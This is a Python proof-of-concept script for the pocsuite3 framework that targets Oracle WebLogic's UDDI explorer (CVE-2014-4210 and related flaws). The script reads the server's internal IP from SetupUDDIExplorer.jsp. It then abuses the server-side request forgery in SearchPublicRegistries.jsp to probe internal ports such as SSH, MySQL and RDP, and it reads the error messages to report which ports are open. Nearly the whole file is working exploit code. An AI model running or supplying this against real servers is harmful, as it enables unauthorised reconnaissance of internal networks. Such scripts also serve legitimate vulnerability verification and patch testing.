#!/usr/bin/env python
# coding: utf-8
import re
from urllib.parse import urlparse
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = 'hancool'
    vulDate = '2014-6-1'
    createDate = '2019-5-30'
    updateDate = '2019-5-30'
    references = [
        'https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html',
    ]
    name = 'WebLogic SSRF And XSS(CVE-2014-4241, CVE-2014-4210, CVE-2014-4242)'
    appPowerLink = 'https://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html'
    appName = 'WebLogic'
    appVersion = 'All'
    vulType = VUL_TYPE.XSS
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
    Universal Description Discovery and Integration (UDDI) functionality often lurks unlinked but externally accessible on WebLogic servers. 
    It’s trivially discoverable using fuzz lists such as Weblogic.fuzz.txt and was, until recently, 
    vulnerable to Cross Site Scripting (XSS) and Server Side Request Forgery (SSRF).
    '''

    def _verify(self):
        def ssrf(target):
            # {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
            proxies = None
            headers = {
                'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)', 'Connection': 'close'}
            timeout = 5
            ports_ssrf = '21,22,23,80,443,1521,3306,3389,8080,7001,17001'
            status, ssrf_ip, results = False, '', []
            try:
                s = req.Session()
                r_test = s.get('{}/uddiexplorer/SetupUDDIExplorer.jsp'.format(target),
                               headers=headers, timeout=timeout, proxies=proxies)
                if r_test.status_code == 200:
                    regex = 'http://(.*)/uddi/uddilistener'
                    ip_ssrf = re.findall(regex, r_test.content)[0]
                    if ip_ssrf != '':
                        ssrf_ip = ip_ssrf.split(':')[0]
                        for port in ports_ssrf.split(','):
                            try:
                                url = '{}/uddiexplorer/SearchPublicRegistries.jsp?operator=http://{}:{}&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'.format(
                                    target, ssrf_ip, port)
                                r = s.get(url, headers=headers,
                                          timeout=timeout, proxies=proxies)
                                re_sult4 = re.findall(
                                    'IO Exception on sendMessage', r.content)
                                # 如果是404页面，则说明已删除了该页面，不存在漏洞利用，结束检测
                                if r.status_code == 404 or len(re_sult4) != 0:
                                    break
                                re_sult1 = re.findall(
                                    'weblogic.uddi.client.structures.exception.XML_SoapException', r.content)
                                re_sult2 = re.findall(
                                    'No route to host', r.content)
                                re_sult3 = re.findall(
                                    'but could not connect', r.content)
                                if len(re_sult1) != 0 and len(re_sult2) == 0 and len(re_sult3) == 0:
                                    results.append(port)
                                    status = True
                            # 如果一个端口发生超时则跳过该端口继续：
                            except req.exceptions.ReadTimeout:
                                continue
                            except req.exceptions.ConnectionError:
                                continue
            except Exception as ex:
                pass
                # raise(ex)

            return (status, ssrf_ip, ','.join(results))

        '''
        verify:
        '''
        result = {}
        pr = urlparse(self.url)
        if pr.port:  # and pr.port not in ports:
            ports = [pr.port]
        else:
            ports = [7001, 17001, 27001]
        for port in ports:
            uri = "{0}://{1}:{2}".format(pr.scheme, pr.hostname, str(port))
            status, ssrf_ip, msg = ssrf(uri)
            if status:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = uri
                result['extra'] = {}
                result['extra']['evidence'] = 'opend ports -> {}'.format(msg)
                break

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(TestPOC)
